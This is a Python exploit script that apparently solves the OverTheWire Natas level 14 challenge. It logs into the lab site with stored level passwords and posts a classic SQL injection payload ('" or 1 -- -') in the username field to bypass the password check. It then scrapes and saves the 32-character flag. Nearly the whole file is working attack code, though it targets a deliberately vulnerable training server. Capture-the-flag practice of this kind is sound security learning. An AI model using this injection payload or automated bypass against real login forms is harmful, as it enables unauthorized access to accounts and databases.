#!/usr/bin/env python

import requests
import re
import sys

from pathlib import Path
from bs4 import BeautifulSoup
from statuslib import status as s

# SQL query code on natas
# $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";

## Change values of the payload

sql_username = '" or 1 -- -'    # perform sql injection
sql_password = 'anypassword'    # This will be commented out
save_the_flag = True


## -- 

def get_password(url, username, passwords):

	# Get password from the passwords.txt and verify it it correct.

	for password in passwords:

            password = password.strip()
            http = requests.post(url, auth=(username, password))

            if http.status_code != 200:
                pass
        
            else:
                return password

def web_request(url, username, password):

    http = requests.post(url, auth=(username, password))

    if http.status_code != 200:
        s.failed('Failed -> ERROR status code: %s' % (http.status_code))
        return http.status_code

    else:
        s.success('Success -> OK status code: %s' % (http.status_code))
        return http.status_code


def send_form_data(url, username, password, status_code, **kwargs):

    http = requests.post(url, auth=(username, password))


    # get payload input
    payload1 = kwargs['payload1']
    payload2 = kwargs['payload2']

    if status_code != 200:
        s.failed('Failed. Unable to connect -> ERROR status code: %s' % (status_code))
        sys.exit(1)

    else:
        # Input values according to natas14

        # Send POST data to server
        post_data = {
                'username': payload1,
                'password': payload2,
                'submit': 'submit'
        }

        send_file = requests.post(url, auth=(username, password), data=post_data)
    
        try:
            s.working('Trying to log in.. -> status code: %s\n' % (send_file.status_code))

            soup = BeautifulSoup(send_file.text, 'html.parser')
            result = soup.select('#content')[0].text

            flag = re.search(r'[a-zA-Z0-9]{32}', result)

            if flag:
                s.success('Enjoy your flag! -> %s' % (flag.group(0)))
                return flag.group(0)

            if flag is None:
                s.failed('Access Denied. Incorrect DB username or password.')
                sys.exit(1)

        except AttributeError:
            pass


def save_flag(data, save=False):

    try:
        if save:
            with open('flag.txt', 'w') as f:
                f.write(data)

    except TypeError:
        pass

def main(url, username, passwords, save=False, **kwargs):

    # Send post data as payload
    payload1 = kwargs['sql_username']
    payload2 = kwargs['sql_password']

    s.info('Started. -> Exploiting %s' % (username))
    s.working('Connecting -> to target server..\n')

    password = get_password(url, username, passwords)
    status = web_request(url, username, password)
    flag = send_form_data(url, 
                          username,
                          password,
                          status_code=status,
                          payload1=payload1,
                          payload2=payload2
                        )
    
    save_flag(flag, save=save)


if __name__ == '__main__':
 
    level = 14
    username = '%s%s' % ('natas', level)
    passwords = open(Path('../passwords.txt'), 'r').readlines()

    url = 'http://%s.natas.labs.overthewire.org/' % username

    main(url, username, passwords, save=save_the_flag, 
         sql_username=sql_username, sql_password=sql_password)

